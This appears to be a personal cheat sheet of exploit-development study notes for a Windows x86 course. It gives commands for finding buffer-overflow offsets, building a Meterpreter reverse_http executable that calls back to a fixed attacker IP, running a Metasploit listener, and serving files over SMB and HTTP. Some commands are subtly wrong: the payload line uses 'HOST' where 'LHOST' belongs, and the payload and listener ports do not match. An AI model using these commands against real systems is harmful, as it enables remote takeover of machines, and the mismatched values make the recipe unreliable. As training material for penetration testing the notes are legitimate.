# x86Win-OSED-Notes

Pattern generation:
```
$ msf-pattern_create -l 800
$ msf-pattern_offset -l 800 -q 42306142
```

met payload:
```
$ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe

# Exploit after met.exe execution
$ msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

smbserver:
```
sudo smbserver.py met /home/kali/ -smb2support
```

http-server:
```
python3 -m http.server
```
